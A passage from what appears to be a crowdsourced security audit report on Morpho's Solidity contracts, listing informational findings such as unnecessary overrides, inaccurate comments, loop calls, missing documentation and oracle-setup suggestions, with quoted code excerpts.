[127](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L127), [144](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L144), [145](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L145), [155](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L155), [164](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L164), [173](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L173)



### Use EIP-5627 to describe EIP-712 domains

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

EIP-5267 is a standard which allows for the retrieval and description of EIP-712 hash domains. This enable external tools to allow users to view the fields and values that describe their domain.
 This is especially useful when a project may exist on multiple chains and or in multiple contracts, and allows users/tools to verify that the signature is for the right fork, chain, version, contract, etc.

*Instances (1)*:

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

5:     keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L5)




### Expressions for constant values such as a call to `keccak256()`, should use `immutable` rather than `constant`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

While it doesn't save any gas because the compiler knows that developers often make this mistake, it's still best to use theright tool for the task at hand. There is a difference between `constant` variables and `immutable` variables, and they shouldeach be used in their appropriate contexts. `constants` should be used for literal values written into the code, and `immutable`variables should be used for expressions, or values calculated in, or passed into the constructor.

*Instances (1)*:

```solidity
File: morpho-blue/src/libraries/MarketParamsLib.sol

13:     uint256 internal constant MARKET_PARAMS_BYTES_LENGTH = 5 * 32;

```

[13](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/MarketParamsLib.sol#L13)



### Use a more recent version of solidity	_(duplicate of [Different solidity versions across the code base])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (3)*:

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

2: pragma solidity 0.8.19;

```

[2](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L2)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

2: pragma solidity 0.8.19;

```

[2](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L2)

```solidity
File: universal-rewards-distributor/src/UrdFactory.sol

2: pragma solidity 0.8.19;

```

[2](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UrdFactory.sol#L2)




### Use of `override` is unnecessary	_(duplicate of [Use of override is unnecessary])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Starting with Solidity version [0.8.8](https://docs.soliditylang.org/en/v0.8.20/contracts.html#function-overriding), using the override keyword when the function solely overrides an interface function, and the function doesn'texist in multiple base contracts, is unnecessary.

*Instances (22)*:


```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

58:     function decimals() public view virtual override(ERC20, ERC20Wrapper) returns (uint8) {

66:     function _update(address from, address to, uint256 value) internal virtual override {

```

[58](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L58), [66](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L66)

```solidity
File: metamorpho/src/MetaMorpho.sol

526:     function decimals() public view override(ERC20, ERC4626) returns (uint8) {

531:     function maxDeposit(address) public view override returns (uint256) {

536:     function maxMint(address) public view override returns (uint256) {

545:     function maxWithdraw(address owner) public view override returns (uint256 assets) {

552:     function maxRedeem(address owner) public view override returns (uint256) {

559:     function deposit(uint256 assets, address receiver) public override returns (uint256 shares) {

572:     function mint(uint256 shares, address receiver) public override returns (uint256 assets) {

585:     function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {

599:     function redeem(uint256 shares, address receiver, address owner) public override returns (uint256 assets) {

613:     function totalAssets() public view override returns (uint256 assets) {

622:     function _decimalsOffset() internal pure override returns (uint8) {

657:     function _convertToShares(uint256 assets, Math.Rounding rounding) internal view override returns (uint256) {

665:     function _convertToAssets(uint256 shares, Math.Rounding rounding) internal view override returns (uint256) {

695:     function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {

711:     function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares)
712:             internal
713:             override
714:         {

```

[526](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L526), [531](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L531), [536](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L536), [545](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L545), [552](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L552), [559](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L559), [572](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L572), [585](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L585), [599](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L599), [613](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L613), [622](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L622), [657](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L657), [665](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L665), [695](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L695), [711-714](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L711-L714)

```solidity
File: morpho-blue-bundlers/src/MorphoBundler.sol

279:     function _isSenderAuthorized() internal view virtual override returns (bool) {

```

[279](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L279)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumBundler.sol

39:     function _isSenderAuthorized() internal view override(BaseBundler, MorphoBundler) returns (bool) {

```

[39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumBundler.sol#L39)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV2MigrationBundler.sol

64:     function _isSenderAuthorized() internal view virtual override(BaseBundler, MigrationBundler) returns (bool) {

```

[64](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L64)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol

78:     function _isSenderAuthorized() internal view override(BaseBundler, MigrationBundler) returns (bool) {

```

[78](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L78)

```solidity
File: morpho-blue-bundlers/src/migration/MigrationBundler.sol

27:     function _isSenderAuthorized() internal view virtual override(BaseBundler, MorphoBundler) returns (bool) {

```

[27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/MigrationBundler.sol#L27)




### Use `safePermit` instead of `permit`	_(duplicate of [Use `safePermit` in place of `permit`])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

OpenZeppelin's `SafePermit` is designed to facilitate secure and seamless token approvals via off-chain signed messages, mitigating the risks associated with on-chain transactions. It follows the `ERC-2612` standard, ensuring compatibility with various wallets and dApps, and aligning with established industry guidelines.

*Instances (3)*:

```solidity
File: morpho-blue-bundlers/src/Permit2Bundler.sol

33:         try Permit2Lib.PERMIT2.permit(initiator(), permitSingle, signature) {}

```

[33](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/Permit2Bundler.sol#L33)

```solidity
File: morpho-blue-bundlers/src/PermitBundler.sol

27:         try IERC20Permit(asset).permit(initiator(), address(this), amount, deadline, v, r, s) {}

```

[27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/PermitBundler.sol#L27)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumPermitBundler.sol

29:         try IDaiPermit(MainnetLib.DAI).permit(initiator(), address(this), nonce, expiry, allowed, v, r, s) {}

```

[29](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumPermitBundler.sol#L29)




### Consider Enabling --via-ir for Enhanced Code Transparency and Auditability

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

The --via-ir command line option enables Solidity's IR-based code generator, offering a level of transparency and auditability superior to the traditional, direct-to-EVM method. The Intermediate Representation (IR) in Yul serves as an intermediary, offering a more transparent view of how the Solidity code is transformed into EVM bytecode.

While it does introduce slight semantic variations, these are mostly in areas unlikely to impact the typical contract's behavior. It is encouraged to test this feature to gain its benefits, which include making the code generation process more transparent and auditable.[Solidity Documentation.](https://docs.soliditylang.org/en/v0.8.20/ir-breaking-changes.html#solidity-ir-based-codegen-changes)

*Instances (1)*:

```solidity
File: Various Files

1: 

```

[1](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L1)




### Solmate’s SafeTransferLib does not checks if the token is a contract or not	_(duplicate of [Solmate safeTransferLib.sol functions does not check the codesize of the token address, which may lead to fund loss])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

There is a subtle difference between the implementation of solmate’s SafeTransferLib and OZ’s SafeERC20: OZ’s SafeERC20 checks if the token is a contract or not, solmate’s SafeTransferLib does not. See this [link](See: https://github.com/Rari-Capital/solmate/blob/main/src/utils/SafeTransferLib.sol#L9)
 Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller. As a result, when the token’s address has no code, the transaction will just succeed with no error. This attack vector was made well-known by the qBridge hack back in Jan 2022.
 So, the `safetransfer` and `safetransferfrom` don’t check the existence of code at the token address. This is a known issue while using solmate’s libraries.
 Hence this can lead to miscalculation of funds and also loss of funds , because if `safetransfer()` and `safetransferfrom()` are called on a token address that doesn’t have contract in it, it will always return success. Due to this protocol will think that funds has been transferred and successful , and records will be accordingly calculated, but in reality funds were never transferred.
 So this will lead to miscalculation and loss of funds.

*Instances (3)*:


```solidity
File: morpho-blue-bundlers/src/TransferBundler.sol

51:         ERC20(asset).safeTransfer(recipient, amount);

65:         ERC20(asset).safeTransferFrom(_initiator, address(this), amount);

```

[51](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L51), [65](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L65)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

133:         ERC20(reward).safeTransfer(account, amount);

```

[133](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L133)




### Array does not have a `pop` function

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Array entries are added but are never removed. Consider whether this should be the case, or whether there should be a maximum, or whether old entries should be removed. Cases where there are specific potential problems will be flagged separately under a different issue.

*Instances (2)*:

```solidity
File: metamorpho/src/MetaMorpho.sol

771:                 supplyQueue.push(id);

772:                 withdrawQueue.push(id);

```

[771](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L771), [772](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L772)



### Function calls within in loops	_(duplicate of [Using `delegatecall` inside a loop])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Making function calls within loops in Solidity can lead to inefficient gas usage, potential bottlenecks, and increased vulnerability to attacks. Each function call or external call consumes gas, and when executed within a loop, the gas cost multiplies, potentially causing the transaction to run out of gas or exceed block gas limits. This can result in transaction failure or unpredictable behavior.

*Instances (7)*:

```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit _accruedSupplyBalance() on line 404, _msgSender() on line 439, asset() on line 408, _msgSender() on line 420
400:         for (uint256 i; i < allocations.length; ++i) {
401:                 MarketAllocation memory allocation = allocations[i];
402:                 Id id = allocation.marketParams.id();
403:     
404:                 (uint256 supplyAssets, uint256 supplyShares,) = _accruedSupplyBalance(allocation.marketParams, id);
405:                 uint256 withdrawn = supplyAssets.zeroFloorSub(allocation.assets);
406:     
407:                 if (withdrawn > 0) {
408:                     if (allocation.marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);
409:     
410:                     // Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market.
411:                     uint256 shares;
412:                     if (allocation.assets == 0) {
413:                         shares = supplyShares;
414:                         withdrawn = 0;
415:                     }
416:     
417:                     (uint256 withdrawnAssets, uint256 withdrawnShares) =
418:                         MORPHO.withdraw(allocation.marketParams, withdrawn, shares, address(this), address(this));
419:     
420:                     emit EventsLib.ReallocateWithdraw(_msgSender(), id, withdrawnAssets, withdrawnShares);
421:     
422:                     totalWithdrawn += withdrawnAssets;
423:                 } else {
424:                     uint256 suppliedAssets = allocation.assets == type(uint256).max
425:                         ? totalWithdrawn.zeroFloorSub(totalSupplied)
426:                         : allocation.assets.zeroFloorSub(supplyAssets);
427:     
428:                     if (suppliedAssets == 0) continue;
429:     
430:                     uint256 supplyCap = config[id].cap;
431:                     if (supplyCap == 0) revert ErrorsLib.UnauthorizedMarket(id);
432:     
433:                     if (supplyAssets + suppliedAssets > supplyCap) revert ErrorsLib.SupplyCapExceeded(id);
434:     
435:                     // The market's loan asset is guaranteed to be the vault's asset because it has a non-zero supply cap.
436:                     (, uint256 suppliedShares) =
437:                         MORPHO.supply(allocation.marketParams, suppliedAssets, 0, address(this), hex"");
438:     
439:                     emit EventsLib.ReallocateSupply(_msgSender(), id, suppliedAssets, suppliedShares);
440:     
441:                     totalSupplied += suppliedAssets;
442:                 }
443:             }

/// @audit _marketParams() on line 615
614:         for (uint256 i; i < withdrawQueue.length; ++i) {
615:                 assets += MORPHO.expectedSupplyAssets(_marketParams(withdrawQueue[i]), address(this));
616:             }

/// @audit _marketParams() on line 649
643:         for (uint256 i; i < supplyQueue.length; ++i) {
644:                 Id id = supplyQueue[i];
645:     
646:                 uint256 supplyCap = config[id].cap;
647:                 if (supplyCap == 0) continue;
648:     
649:                 uint256 supplyAssets = MORPHO.expectedSupplyAssets(_marketParams(id), address(this));
650:     
651:                 totalSuppliable += supplyCap.zeroFloorSub(supplyAssets);
652:             }

/// @audit _marketParams() on line 804, _accruedSupplyBalance() on line 805
798:         for (uint256 i; i < supplyQueue.length; ++i) {
799:                 Id id = supplyQueue[i];
800:     
801:                 uint256 supplyCap = config[id].cap;
802:                 if (supplyCap == 0) continue;
803:     
804:                 MarketParams memory marketParams = _marketParams(id);
805:                 (uint256 supplyAssets,,) = _accruedSupplyBalance(marketParams, id);
806:     
807:                 uint256 toSupply = UtilsLib.min(supplyCap.zeroFloorSub(supplyAssets), assets);
808:     
809:                 if (toSupply > 0) {
810:                     // Using try/catch to skip markets that revert.
811:                     try MORPHO.supply(marketParams, toSupply, 0, address(this), hex"") {
812:                         assets -= toSupply;
813:                     } catch {}
814:                 }
815:     
816:                 if (assets == 0) return;
817:             }

/// @audit _marketParams() on line 826, _accruedSupplyBalance() on line 827, _withdrawable() on line 830
824:         for (uint256 i; i < withdrawQueue.length; ++i) {
825:                 Id id = withdrawQueue[i];
826:                 MarketParams memory marketParams = _marketParams(id);
827:                 (uint256 supplyAssets,, Market memory market) = _accruedSupplyBalance(marketParams, id);
828:     
829:                 uint256 toWithdraw = UtilsLib.min(
830:                     _withdrawable(marketParams, market.totalSupplyAssets, market.totalBorrowAssets, supplyAssets), assets
831:                 );
832:     
833:                 if (toWithdraw > 0) {
834:                     // Using try/catch to skip markets that revert.
835:                     try MORPHO.withdraw(marketParams, toWithdraw, 0, address(this), address(this)) {
836:                         assets -= toWithdraw;
837:                     } catch {}
838:                 }
839:     
840:                 if (assets == 0) return;
841:             }

/// @audit _marketParams() on line 851, _withdrawable() on line 862
849:         for (uint256 i; i < withdrawQueue.length; ++i) {
850:                 Id id = withdrawQueue[i];
851:                 MarketParams memory marketParams = _marketParams(id);
852:     
853:                 uint256 supplyShares = MORPHO.supplyShares(id, address(this));
854:                 (uint256 totalSupplyAssets, uint256 totalSupplyShares, uint256 totalBorrowAssets,) =
855:                     MORPHO.expectedMarketBalances(marketParams);
856:     
857:                 // The vault withdrawing from Morpho cannot fail because:
858:                 // 1. oracle.price() is never called (the vault doesn't borrow)
859:                 // 2. the amount is capped to the liquidity available on Morpho
860:                 // 3. virtually accruing interest didn't fail
861:                 assets = assets.zeroFloorSub(
862:                     _withdrawable(
863:                         marketParams,
864:                         totalSupplyAssets,
865:                         totalBorrowAssets,
866:                         supplyShares.toAssetsDown(totalSupplyAssets, totalSupplyShares)
867:                     )
868:                 );
869:     
870:                 if (assets == 0) break;
871:             }

```

[400-443](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L400-L443), [614-616](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L614-L616), [643-652](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L643-L652), [798-817](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L798-L817), [824-841](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L824-L841), [849-871](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L849-L871)

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

/// @audit _revert() on line 70
66:         for (uint256 i; i < data.length; ++i) {
67:                (bool success, bytes memory returnData) = address(this).delegatecall(data[i]);
68:    
69:                // No need to check that `address(this)` has code in case of success.
70:                if (!success) _revert(returnData);
71:            }

```

[66-71](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L66-L71)




### Wrong dev comment	_(duplicate of [Incorrect comment])_

**Severity:** Informational

**Context:** [ERC20PermissionedBase.sol#L49-L49](erc20-permissioned/src/ERC20PermissionedBase.sol#L49-L49)

**Description**: The function returns `true` if the account has permission and false if `account` has no permission but the comment specifies otherwise.

**Recommendation**: Make sure the commenting is accurate.



### `update` function is declared twice	_(duplicate of [Overloading of the `update()` function introduces unneeded complexity])_

**Severity:** Informational

**Context:** [PendingLib.sol#L40-L40](metamorpho/src/libraries/PendingLib.sol#L40-L40)

**Description**:
`update` function is defined twice

**Recommendation**:
Remove the second declaration of the function



### Error declaration should include NatSpec `@param` documentation

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (8)*:


```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

/// @audit missed @param (account)
20:     error NoPermission(address account);

```

[20](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L20)

```solidity
File: metamorpho/src/libraries/ErrorsLib.sol

/// @audit missed @param (id)
27:     error UnauthorizedMarket(Id id);

/// @audit missed @param (id)
31:     error InconsistentAsset(Id id);

/// @audit missed @param (id)
34:     error SupplyCapExceeded(Id id);

/// @audit missed @param (id)
46:     error DuplicateMarket(Id id);

/// @audit missed @param (id)
49:     error InvalidMarketRemovalNonZeroCap(Id id);

/// @audit missed @param (id)
52:     error InvalidMarketRemovalNonZeroSupply(Id id);

/// @audit missed @param (id)
55:     error InvalidMarketRemovalTimelockNotElapsed(Id id);

```

[27](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L27), [31](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L31), [34](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L34), [46](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L46), [49](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L49), [52](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L52), [55](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L55)



### Incorrect function name in documentation of `updateWithdrawQueue()`	_(duplicate of [Inaccurate assumptions for `updateWithdrawQueue`])_

**Severity:** Informational

**Context:** [MetaMorpho.sol#L343-L343](metamorpho/src/MetaMorpho.sol#L343-L343)

**Description**:

The comment above the `updateWithdrawQueue()` states "Removing a market requires the vault to have 0 supply on it; but anyone can supply on behalf of the vault so the call to `sortWithdrawQueue` can be griefed by a frontrun. To circumvent this, the allocator can simply bundle a reallocation that withdraws max from this market with a call to `sortWithdrawQueue`.". This is incorrect as no function called `sortWithdrawQueue()` exists. The function is called `updateWithdrawQueue()`.

**Recommendation**:

To rectify this issue, update the comment to accurately reference the updateWithdrawQueue function:

"Removing a market requires the vault to have 0 supply on it; but anyone can supply on behalf of the vault so the call to updateWithdrawQueue can be griefed by a frontrun. To circumvent this, the allocator can simply bundle a reallocation that withdraws max from this market with a call to updateWithdrawQueue."



### The bounding parameters  for AdaptativeCurve constructor are not scaled by WAD Constant

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:

In the ConstantsLib.sol, the value of the following constants are commented as 'scaled by WAD' :

MAX_RATE_AT_TARGET
MIN_RATE_AT_TARGET
MAX_CURVE_STEEPNESS
MAX_ADJUSTMENT_SPEED

This sentence is not true as WAD is not used to compute these constants.

**Recommendation**

At least, replace this sentence by "must be scaled by WAD"



### UniversalRewardsDistributor::pendingRoot() should be derived from IUniversalRewardsDistributor

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

UniversalRewardsDistributor contract should be derived from IUniversalRewardsDistributor interface, but instead, it is derived from IUniversalRewardsDistributorStaticTyping.

The implementation of pendingRoot() function is returning "PendingRoot" object which does not align with the function signature in IUniversalRewardsDistributorStaticTyping.

- Refer:
UniversalRewardsDistributor.sol, line number 18

UniversalRewardsDistributor.sol, line number 44

IUniversalRewardsDistributor.sol, line number 51

- Recommendation:

IUniversalRewardsDistributor is the correct interface to derive from for UniversalRewardsDistributor contract



### Nonexistent reference in comment	_(duplicate of [Inaccurate assumptions for `updateWithdrawQueue`])_

**Severity:** Informational

**Context:** [MetaMorpho.sol#L343-L343](metamorpho/src/MetaMorpho.sol#L343-L343)

`sortWithdrawQueue` does not exist. do you mean `updateWithdrawQueue`?



### Lack Of Zero Address/Value Checks	_(duplicate of [Using zero as a parameter])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

There are instances in the codebase where if the address parameter is mistakenly set to  0 address then it might be problematic for the system , these instances include ->

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L198
https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L187
https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L207



### TyposMisleading Comments In The Codebase

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

There are a couple of instances of these  , they are -> 

https://github.com/morpho-org/erc20-permissioned/blob/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L49 --> Wrong comment , it should be `Returns true if `account` has  permission.` instead of `Returns true if `account` has no permission.`

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L264 -> Guardian instead of gardan



### Empty Catch Block

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

The catch block here https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L813 is empty.

Having an empty catch block in a try-catch statement can be problematic because it essentially silences any exceptions that might occur within the corresponding try block. This can make it difficult to identify and diagnose issues in the code.

Recommendation:

Catch the exception/error that was thrown by the try block



### double oracle set up 

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

The double oracle setup serves two primary purposes. Firstly, it reduces the risk of price manipulation by relying on the Chainlink oracle, which ensures accurate pricing . Secondly, incorporating an on-chain liquidity-based oracle acts as a safeguard against  depegging. 

If the protocol is willing to use steth ,WBTC ,dai  or something like depegging to some Token , double orcale set up is recomended .Chainlink oracle is really great for preventing from the price manipulation but For some depegging events ,integrating  on-chain liquidity-based oracle, such as UniV3 TWAP is great choice .By monitoring the price derived from the liquidity-based oracle and comparing it to the Chainlink oracle's price, borrowing activities can be halted if the threshold deviation  is breached.

Double oracle set up can prevent from  borrowing against a devalued asset and the accumulation of bad debt



### Add A Min Check in erc4626Redeem

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

In the erc4626Redeem function here https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L110 , 
add another `min` check after the L119 , if owner is address(this) then shares must be min of shares and balanceOf(address(this))
Similar to L63 and L64

Recommendation:

Add the above min check.



### Sanity Check For The Approval

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

In the erc20TransferFrom function of the TransferBundler , we perform a regular safeTransferFrom , there should be a sanity check in this function https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L59 which should ensure that the allowance of the `spender` is atleast `amount`



### Oracle Price Feeds Not Updated Frequently

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Care must be taken when selecting which price oracle(s) to use; [using an oracle price feed that isn’t updated frequently](https://github.com/sherlock-audit/2022-09-notional-judging/issues/67) will result in calculations being performed with inaccurate prices that don’t reflect the true value of the asset.

Chainlink Oracles are currently the safest choice, but even then, care must be taken regarding which price feed to choose; [similar price feeds can have different heartbeat & deviation thresholds](https://github.com/sherlock-audit/2023-03-olympus-judging/issues/2); the longer the heartbeat & higher the deviation threshold, the more the oracle price can differ from the true, current price.



###  Solidity version 0.8.20 may not work on other chains due to PUSH0	_(duplicate of [Solidity version can cause issues in L2s that do not support PUSH0 opcode])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

The compiler for Solidity 0.8.20 switches the default target EVM version to [Shanghai](https://blog.soliditylang.org/2023/05/10/solidity-0.8.20-release-announcement/#important-note), which includes the new PUSH0 op code. This op code may not yet be implemented on all L2s, so deployment on these chains will fail. To work around this issue, use an earlier [EVM](https://docs.soliditylang.org/en/v0.8.20/using-the-compiler.html?ref=zaryabs.com#setting-the-evm-version-to-target) [version](https://book.getfoundry.sh/reference/config/solidity-compiler#evm_version). While the project itself may or may not compile with 0.8.20, other projects with which it integrates, or which extend this project may, and those projects will have problems deploying these contracts/libraries.

It is recommended to deploy on  < 8.20 to prevent such case (since meta morpho would br deployed on 0.8.21)



### Inconsistent use of _msgSender() and sender	_(duplicate of [Non-Uniformly access to msg.sender in MetaMorpho modifiers])_

**Severity:** Informational

**Context:** [MetaMorpho.sol#L158-L158](metamorpho/src/MetaMorpho.sol#L158-L158)

In `onlyCuratorRole()` and `onlyAllocatorRole()`, `_msgSender()` is assigned to `sender` in `address sender = _msgSender();`, but in `onlyGuardianRole()` and `onlyCuratorOrGuardianRole()`, `_msgSender()` is used as it is.

_recommendation_：Unify with either `sender` or `_msgSender()`



### Incorrect link in Chainlink Interface

**Severity:** Informational

**Context:** [AggregatorV3Interface.sol#L5-L5](morpho-blue-oracles/src/interfaces/AggregatorV3Interface.sol#L5-L5)

**Description**:

